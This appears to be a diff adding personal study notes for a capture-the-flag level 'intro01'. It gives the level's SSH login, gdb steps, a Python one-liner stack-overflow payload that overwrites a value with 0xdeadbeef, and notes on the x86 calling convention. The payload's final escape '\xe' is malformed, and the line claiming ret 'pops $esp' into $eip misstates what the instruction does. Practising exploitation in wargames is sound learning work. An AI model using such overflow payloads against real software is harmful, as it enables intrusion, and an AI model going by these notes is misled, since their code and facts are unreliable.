@@ -1,0 +1,30 @@
+ssh intro01:intro01
+
+cd /levels
+./intro01
+python -c 'print "A"*20'
+gdb ./intro01
+run
+disas main
+
+python -c 'print "A"*64 + "\xef\xbe\xad\xe"'; cat | ./intro01
+
+Calling Functions
+---------------------------
+- Push arguments onto stack
+- Push return address
+- Set $eip to destination
+- Save $ebp on stack
+- Change $ebp to point to saved $ebp on stack
+- Make space for locals
+
+
+Returning:
+- Put return value into $eax
+- leave instruction
+	- Set $esp to $ebp (pop everything but $ebp)
+	- Pop $ebp (into $ebp, restoring the old base pointer)
+- ret instruction
+	- Pops $esp (return address) into $eip
+
+Note that on returning, we don't pop the arguments to the called function!
